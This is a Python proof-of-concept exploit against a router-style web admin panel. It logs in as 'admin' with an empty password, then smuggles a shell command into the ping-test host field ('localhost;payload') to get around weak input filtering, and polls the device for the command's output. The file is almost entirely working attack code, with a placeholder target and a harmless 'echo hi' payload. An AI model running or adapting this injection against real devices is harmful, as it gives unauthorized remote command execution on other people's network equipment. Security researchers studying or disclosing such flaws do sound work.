import requests
import time
import urllib3
urllib3.disable_warnings()

target = "" # 192.168.50.1
payload = "echo hi"

sess = requests.Session()
sess.verify = False

auth_headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0',
    'Referer': f'http://{target}/LoginForm.asp',
    'Connection': 'close',
}

auth_data = {
    'username': 'admin',
    'password': '',
}

r = sess.post(f'http://{target}/goform/LoginForm', headers=auth_headers, data=auth_data)

if r.status_code not in (200, 302):
    print("login failed")
    exit()

# stop previous pings
sess.post(
    f'http://{target}/goform/PingTestLoadForm',
    headers={'Connection': 'close'},
    data={'PingEvent': 'Stoping', 'PING_LINE_COUNT': '1'}
)

# inject the payload
sess.post(
    f'http://{target}/goform/PingTestLoadForm',
    headers={'Connection': 'close'},
    data={
        'K452_0': '1',
        'K450_0': f'localhost;{payload}', # keep localhost to bypass poor sanitization
        'K451_0': '4', # -c 4
        'K453_0': '56', # -l 56
        'PingEvent': 'Testting', # nice english
        'PING_LINE_COUNT': '0',
    }
)

# poll output
while True:
    out = sess.post(
        f'http://{target}/goform/PingTestLoadForm',
        headers={'Connection': 'close'},
        data={'PingEvent': 'Processing', 'PING_LINE_COUNT': '0'}
    )
    print(out.text) # if your command returns something ( example hi from the echo ) it will print, else the print test will hault and stay active until stopped
    time.sleep(2)
